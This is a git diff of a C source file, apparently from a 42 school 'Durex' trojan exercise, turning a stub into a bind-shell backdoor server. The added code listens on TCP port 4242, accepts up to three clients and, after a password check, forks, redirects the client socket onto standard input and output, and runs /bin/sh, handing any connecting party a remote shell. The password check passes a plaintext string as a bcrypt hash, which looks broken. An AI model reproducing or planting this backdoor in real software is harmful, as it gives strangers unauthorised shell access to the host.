@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   payload.c                                          :+:      :+:    :+:   */
+/*   server.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/11/15 19:41:10 by bccyv             #+#    #+#             */
-/*   Updated: 2021/11/15 23:59:32 by bccyv            ###   ########.fr       */
+/*   Updated: 2021/11/16 19:16:55 by bccyv            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,11 +17,51 @@
 #include <arpa/inet.h>
 #include <durex.h>
 #include <stdio.h>
+#include <bcrypt.h>
 
 #define MAX_CLI_NUMBER 3
 #define PORT 4242
 #define BUF_SIZE 32
+#define PASSWORD_HASH "4242\n"
 
+/*
+ * Disconnects a client and returns his connection fd.
+*/
+int disconnect_client(t_cli *client)
+{
+	int confd = client->confd;
+	close(client->confd);
+	memset(client, 0, sizeof(t_cli));
+	return (confd);
+}
+
+
+void spawn_shell(int confd, int sockfd)
+{
+	int pid = fork();
+
+	if (pid < 0)
+		return;
+
+	if (pid == 0)
+	{
+		for (int i = 3; i < sysconf(_SC_OPEN_MAX); i++)
+		{
+			if (i != confd && i != sockfd)
+				close(i);
+		}
+		for (int i = 0; i < 3; i++)
+	    {
+	        dup2(confd, i);
+	    }
+	    execve("/bin/sh", NULL, NULL);
+		exit(EXIT_FAILURE);
+	}
+}
+
+/*
+ *
+*/
 int sock_init(int port)
 {
 	int sockfd;
@@ -44,6 +84,9 @@ int sock_init(int port)
 	return (sockfd);
 }
 
+/*
+ *
+*/
 int accept_new_connection(int sockfd, t_cli *clients, size_t clients_size)
 {
 	int confd;
@@ -65,7 +108,10 @@ int accept_new_connection(int sockfd, t_cli *clients, size_t clients_size)
 	return (-1);
 }
 
-int read_from_client(t_cli *client)
+/*
+ *
+*/
+int read_from_client(t_cli *client, int sockfd)
 {
 	size_t msg_len;
 	char buf[BUF_SIZE] = {0};
@@ -73,21 +119,23 @@ int read_from_client(t_cli *client)
 	msg_len = recv(client->confd, buf, BUF_SIZE, 0);
 	if (msg_len == 0)
 	{
-		int confd = client->confd;
-		close(client->confd);
-		memset(client, 0, sizeof(t_cli));
-		return (confd);
+		return (disconnect_client(client));
 	}
 	// if (msg_len == BUF_SIZE)
 	// 	sock_flush(client.confd);
 
-	if (strcmp(buf, "4242\n") == 0)
+	if (bcrypt_checkpass(buf, PASSWORD_HASH))
 	{
-		printf("spawn a shell for %d\n", client->confd);
+		printf("coucou\n");
+		spawn_shell(client->confd, sockfd);
+		return (disconnect_client(client));
 	}
 	return (0);
 }
 
+/*
+ *
+*/
 int serve(int sockfd)
 {
 	t_cli clients[MAX_CLI_NUMBER] = {0};
@@ -138,7 +186,7 @@ int serve(int sockfd)
 		{
 			if (FD_ISSET(clients[i].confd, &rtmp))
 			{
-				int confd = read_from_client(&clients[i]);
+				int confd = read_from_client(&clients[i], sockfd);
 				if (confd > 0)
 				{
 					FD_CLR(confd, &rset);
@@ -154,7 +202,10 @@ int serve(int sockfd)
 	return (0);
 }
 
-int payload()
+/*
+ *
+*/
+int main(void)
 {
 	int sockfd;
 
